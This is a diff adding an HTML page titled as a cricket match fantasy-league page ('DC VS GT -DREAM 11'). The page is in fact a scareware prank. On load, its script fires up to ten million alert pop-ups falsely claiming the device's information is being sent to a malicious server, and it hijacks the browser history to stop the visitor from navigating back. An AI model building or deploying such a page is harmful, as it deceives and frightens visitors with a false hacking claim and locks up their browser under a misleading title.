@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>DC VS GT -DREAM 11</title>
+    <style media="screen">
+      *{
+        margin:0;
+        padding:0;
+        box-sizing:border-box;
+      }
+      .box{
+        width:100%;
+        height:100vh;
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        flex-direction:column;
+        text-transform:uppercase;
+        font-family:monospace;
+        font-size:20px;
+        text-align:center;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="box">
+    <h1>you are hacked</h1>
+    <p>this program is sharing your device Information with an unknown malicious server...</p>
+    </div>
+    <script>
+      let hack=(e)=>{
+        for(let i=0;i<=10000000;i++){
+          alert("you are hacked,this program is sharing your device Information with an unknown malicious server...");
+        }
+        history.pushState(null, null, window.top.location.pathname + window.top.location.search);
+        window.addEventListener('popstate', (e) => {
+            e.preventDefault();
+            history.pushState(null, null, window.top.location.pathname + window.top.location.search);
+        });
+      }
+      hack();
+    </script>
+  </body>
+</html>
